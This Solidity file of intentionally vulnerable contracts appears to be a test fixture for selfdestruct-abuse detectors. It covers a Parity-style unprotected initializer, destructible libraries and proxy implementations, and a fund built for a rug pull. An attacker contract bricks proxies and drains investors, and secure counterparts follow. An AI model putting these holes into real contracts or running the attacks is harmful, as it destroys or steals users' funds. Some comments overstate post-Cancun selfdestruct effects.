// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SelfdestructAbuse
 * @notice Demonstrates malicious selfdestruct usage patterns
 *
 * VULNERABILITY: Selfdestruct abuse and contract destruction
 * SEVERITY: Critical
 * CATEGORY: Malicious Patterns / Availability
 *
 * BACKGROUND:
 * SELFDESTRUCT allows contracts to be destroyed and ETH sent to any address.
 * While useful for upgrades, it's also a powerful griefing/attack vector.
 *
 * ATTACK VECTORS:
 * 1. Infrastructure destruction: Destroy critical contracts
 * 2. Proxy bricking: Destroy implementation contracts
 * 3. Rug pulls: Destroy contract after collecting funds
 * 4. State manipulation: Use selfdestruct to manipulate storage
 * 5. Gas manipulation: Selfdestruct refunds used for attacks
 *
 * NOTE: After EIP-6780 (Cancun, March 2024), selfdestruct only sends ETH
 * and doesn't delete code in same transaction, unless in constructor.
 *
 * REAL-WORLD CASES:
 * - Parity Multisig hack (2017) - library destroyed, $150M+ frozen
 * - Various rug pulls using selfdestruct
 * - Proxy upgrade attacks
 *
 * TESTED DETECTORS:
 * - selfdestruct-abuse
 * - missing-access-control
 * - centralization-risk
 */

/**
 * @title VulnerableLibrary
 * @notice Critical library that can be destroyed (Parity-style)
 */
contract VulnerableLibrary {
    address public owner;
    bool public initialized;

    /**
     * @notice VULNERABILITY 1: Unprotected initialization
     * @dev Anyone can initialize and become owner (Parity bug)
     */
    function initializeOwner() external {
        require(!initialized, "Already initialized");
        owner = msg.sender;
        initialized = true;
    }

    /**
     * @notice VULNERABILITY 2: Owner can destroy critical library
     * @dev If library is destroyed, all contracts using it are bricked
     */
    function kill() external {
        require(msg.sender == owner, "Not owner");

        // CRITICAL: Destroys library code
        // All contracts using this library will fail
        selfdestruct(payable(owner));
    }

    function criticalFunction() external pure returns (uint256) {
        return 42;
    }
}

/**
 * @title DependentContract
 * @notice Contract that depends on VulnerableLibrary
 */
contract DependentContract {
    VulnerableLibrary public lib;

    constructor(address _lib) {
        lib = VulnerableLibrary(_lib);
    }

    /**
     * @notice VULNERABILITY 3: Dependency on destructible contract
     * @dev Will fail if library is destroyed
     */
    function useLibrary() external view returns (uint256) {
        // VULNERABLE: If lib is destroyed, this call fails
        return lib.criticalFunction();
    }
}

/**
 * @title VulnerableProxy
 * @notice Upgradeable proxy vulnerable to implementation destruction
 */
contract VulnerableProxy {
    address public implementation;
    address public admin;

    constructor(address _implementation) {
        implementation = _implementation;
        admin = msg.sender;
    }

    /**
     * @notice VULNERABILITY 4: No validation of implementation
     */
    function upgrade(address newImplementation) external {
        require(msg.sender == admin, "Not admin");

        // VULNERABLE: No check if new implementation is destructible
        // No check if current implementation is being destroyed
        implementation = newImplementation;
    }

    fallback() external payable {
        address impl = implementation;

        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())

            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

/**
 * @title MaliciousImplementation
 * @notice Implementation that can destroy itself
 */
contract MaliciousImplementation {
    address public owner;

    function initialize(address _owner) external {
        owner = _owner;
    }

    function doSomething() external pure returns (uint256) {
        return 123;
    }

    /**
     * @notice ATTACK 1: Destroy implementation contract
     * @dev Bricks all proxies using this implementation
     */
    function rugPull() external {
        require(msg.sender == owner, "Not owner");

        // MALICIOUS: Destroy implementation
        // All proxies become useless
        selfdestruct(payable(owner));
    }
}

/**
 * @title VulnerableInvestmentFund
 * @notice Investment fund vulnerable to rug pull via selfdestruct
 */
contract VulnerableInvestmentFund {
    address public manager;
    mapping(address => uint256) public investments;
    uint256 public totalInvested;

    constructor() {
        manager = msg.sender;
    }

    function invest() external payable {
        investments[msg.sender] += msg.value;
        totalInvested += msg.value;
    }

    /**
     * @notice VULNERABILITY 5: Manager can destroy contract and steal funds
     * @dev Classic rug pull pattern
     */
    function closeAndWithdraw() external {
        require(msg.sender == manager, "Not manager");

        // MALICIOUS: Destroy contract, send all funds to manager
        // Investors lose everything
        selfdestruct(payable(manager));
    }

    /**
     * @notice VULNERABILITY 6: Weak withdrawal protection
     */
    function withdraw() external {
        uint256 amount = investments[msg.sender];
        require(amount > 0, "No investment");

        // VULNERABLE: Manager can front-run withdrawals with selfdestruct
        investments[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}

/**
 * @title SelfdestructRugPullAttacker
 * @notice Demonstrates various selfdestruct attack patterns
 */
contract SelfdestructRugPullAttacker {
    /**
     * @notice ATTACK 2: Parity-style library destruction
     */
    function parityAttack(address libraryAddr) external {
        VulnerableLibrary lib = VulnerableLibrary(libraryAddr);

        // Step 1: Initialize as owner (Parity bug)
        lib.initializeOwner();

        // Step 2: Destroy library
        lib.kill();

        // Result: All contracts using library are bricked
    }

    /**
     * @notice ATTACK 3: Proxy brick attack
     */
    function brickProxy(address proxyAddr, address maliciousImpl) external {
        VulnerableProxy proxy = VulnerableProxy(proxyAddr);

        // Step 1: Become admin (assume compromised)
        // Step 2: Upgrade to malicious implementation
        proxy.upgrade(maliciousImpl);

        // Step 3: Destroy malicious implementation
        MaliciousImplementation(maliciousImpl).rugPull();

        // Result: Proxy is bricked, cannot be upgraded
    }

    /**
     * @notice ATTACK 4: Investment fund rug pull
     */
    function rugPullFund(address fundAddr) external {
        VulnerableInvestmentFund fund = VulnerableInvestmentFund(fundAddr);

        // Assume attacker is manager or compromised manager
        fund.closeAndWithdraw();

        // Result: All investor funds stolen
    }
}

/**
 * @title VulnerableFactory
 * @notice Factory that creates destructible contracts
 */
contract VulnerableFactory {
    address[] public deployedContracts;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice VULNERABILITY 7: Creates contracts with selfdestruct
     */
    function createContract() external returns (address) {
        DestructibleChild child = new DestructibleChild(owner);
        deployedContracts.push(address(child));
        return address(child);
    }

    /**
     * @notice ATTACK 5: Mass destruction of factory-created contracts
     */
    function destroyAll() external {
        require(msg.sender == owner, "Not owner");

        // MALICIOUS: Destroy all created contracts
        for (uint256 i = 0; i < deployedContracts.length; i++) {
            DestructibleChild(deployedContracts[i]).destroy();
        }
    }

    function getDeployedContracts() external view returns (address[] memory) {
        return deployedContracts;
    }
}

/**
 * @title DestructibleChild
 * @notice Child contract that can be destroyed by factory
 */
contract DestructibleChild {
    address public owner;
    uint256 public data;

    constructor(address _owner) {
        owner = _owner;
    }

    function setData(uint256 _data) external {
        data = _data;
    }

    /**
     * @notice VULNERABILITY 8: Unprotected selfdestruct
     */
    function destroy() external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }
}

/**
 * @title SecureContract
 * @notice Demonstrates proper patterns without selfdestruct
 */
contract SecureContract {
    address public owner;
    bool public paused;

    mapping(address => uint256) public investments;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice MITIGATION 1: Use pause instead of selfdestruct
     */
    function emergencyPause() external {
        require(msg.sender == owner, "Not owner");
        paused = true;
    }

    function unpause() external {
        require(msg.sender == owner, "Not owner");
        paused = false;
    }

    /**
     * @notice MITIGATION 2: Structured withdrawal instead of selfdestruct
     */
    function emergencyWithdraw(address to) external {
        require(msg.sender == owner, "Not owner");
        require(paused, "Must be paused");

        uint256 amount = address(this).balance;
        payable(to).transfer(amount);
    }

    /**
     * @notice MITIGATION 3: User withdrawals instead of contract destruction
     */
    function withdraw() external {
        require(!paused, "Contract paused");

        uint256 amount = investments[msg.sender];
        require(amount > 0, "No investment");

        investments[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    /**
     * @notice MITIGATION 4: NO SELFDESTRUCT
     * @dev Contract cannot be destroyed, only paused
     */
}

/**
 * @title SecureProxy
 * @notice Proxy with protections against implementation destruction
 */
contract SecureProxy {
    address public implementation;
    address public admin;
    bool public locked;

    event Upgraded(address indexed newImplementation);

    constructor(address _implementation) {
        implementation = _implementation;
        admin = msg.sender;
    }

    /**
     * @notice MITIGATION 5: Validate implementation before upgrade
     */
    function upgrade(address newImplementation) external {
        require(msg.sender == admin, "Not admin");
        require(!locked, "Locked");
        require(newImplementation != address(0), "Invalid implementation");

        // MITIGATION: Check implementation has code
        uint256 size;
        assembly {
            size := extcodesize(newImplementation)
        }
        require(size > 0, "Implementation has no code");

        implementation = newImplementation;
        emit Upgraded(newImplementation);
    }

    /**
     * @notice MITIGATION 6: Timelock for critical operations
     */
    function lockProxy() external {
        require(msg.sender == admin, "Not admin");
        locked = true;
    }

    fallback() external payable {
        address impl = implementation;

        // MITIGATION: Verify implementation still has code
        uint256 size;
        assembly {
            size := extcodesize(impl)
        }
        require(size > 0, "Implementation destroyed");

        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())

            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}
